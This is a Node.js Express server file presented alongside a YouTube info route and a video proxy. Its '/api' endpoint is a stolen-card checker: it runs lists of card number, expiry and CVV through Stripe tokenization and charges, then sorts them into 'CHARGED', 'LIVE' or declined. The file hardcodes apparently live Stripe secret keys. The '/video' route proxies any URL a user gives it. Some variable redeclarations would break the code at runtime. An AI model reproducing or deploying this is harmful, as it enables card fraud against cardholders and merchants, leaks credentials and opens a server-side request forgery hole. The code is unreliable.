const express = require('express');
const app = express();
const { createProxyMiddleware } = require('http-proxy-middleware');
const url = require('url');
//modules
const fs = require('fs')
const cors = require('cors')
const axios = require('axios');


const youtubeRoute = require('./route/get-yt-info')

//Express stuff and environment variables
require('dotenv').config();
require('express-async-errors')

//Used By Express
app.use(express.json());
app.use(cors({
    origin: 'http://localhost:5500',
    optionsSuccessStatus: 200 // some legacy browsers (IE11, various SmartTVs) choke on 204
  }
   ))
app.use(express.static('./public'))
//routes
app.use('/api/v1',youtubeRoute)





app.get('/api', async (req, res) => {
    const startTime = Date.now();

    const cards = req.query.lista || "";
    const mode = req.query.mode || "cvv";
    const amount = parseInt(req.query.amount) || 1;
    const currency = req.query.currency || "usd";

    if (!cards) {
        return res.send("Please enter card details");
    }

    const cardList = cards.split(",");
    const results = [];

    const pk = 'pk_live_51HfBwmD4mk8ECiEaK52fL9vngrRWrLNtA0N2LEC9OGWMd15vtAyz2fFeKMXXWT61L5JlAZs5tePyOefl6YrXvXtc00WGdR32ky';
    const sk = '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';

    for (const card of cardList) {
        const split = card.split("|");
        const cc = split[0] || '';
        const mes = split[1] || '';
        const ano = split[2] || '';
        const cvv = split[3] || '';

        if (!cc || !mes || !ano || !cvv) {
            results.push(`Invalid card details for ${card}`);
            continue;
        }

        const tokenData = {
            'card[number]': cc,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'card[cvc]': cvv
        };

        try {
            const tokenResponse = await axios.post('https://api.stripe.com/v1/tokens', new URLSearchParams(tokenData), {
                headers: {
                    'Authorization': `Bearer ${pk}`,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            });

            const tokenData = tokenResponse.data;
            const tokenId = tokenData.id || '';

            if (!tokenId) {
                results.push(`Token creation failed for ${card}`);
                continue;
            }

            const chargeData = {
                'amount': amount * 100,
                'currency': currency,
                'source': tokenId,
                'description': 'Charge for product/service'
            };

            const chargeResponse = await axios.post('https://api.stripe.com/v1/charges', new URLSearchParams(chargeData), {
                headers: {
                    'Authorization': `Bearer ${sk}`,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            });

            const chargeData = chargeResponse.data;
            const elapsedTime = ((Date.now() - startTime) / 1000).toFixed(2);

            if (chargeResponse.status === 200 && chargeData.status === "succeeded") {
                results.push(`CHARGED-->${card}-->[Charged successfully ✅]`);
            } else if (chargeData.error && chargeData.error.message.includes("Your card's security code is incorrect")) {
                results.push(`LIVE-->${card}-->[CCN LIVE✅]`);
            } else if (chargeData.error && chargeData.error.message.includes("insufficient funds")) {
                results.push(`LIVE-->${card}-->[insufficient funds✅]`);
            } else {
                results.push(`Declined ❌️-->${card}-->[${chargeData.error ? chargeData.error.message : 'Unknown error'}]`);
            }
        } catch (error) {
            results.push(`Error: ${error.response.data.error.message || 'Unknown error'} for ${card}`);
        }
    }

    res.send(results.join('<br>'));
});



app.use('/video', (req, res, next) => {
    const videoUrl = req.query.url;
    if (!videoUrl) {
      return res.status(400).send('URL is required');
    }
    try {
      new URL(videoUrl); // Validate URL format
      next();
    } catch (err) {
      res.status(400).send('Invalid URL');
    }
  });
  
  // Proxy middleware to forward the video request
  app.use('/video', createProxyMiddleware({
    target: '', // No target host needed because we are dynamically routing based on URL
    changeOrigin: true,
       
    router: (req) => {
      const videoUrl = req.query.url;
      const parsedUrl = url.parse(videoUrl);
      
      const ret= `${parsedUrl.protocol}//${parsedUrl.host}`;
      
      return ret
    },
    
    pathRewrite: (path, req) => {
        
        const videoUrl = req.query.url;
        const parsedUrl = url.parse(videoUrl);
        return parsedUrl.path; // Keep the full path and its extension
    },
      
    onError: (err, req, res) => {
      console.error('Proxy error:', err);
      res.status(500).send('Error fetching video');
    }
  }));
  


const port = process.env.PORT || 5000;
app.listen(port,()=>{
    console.log('server runngindfkd')
})
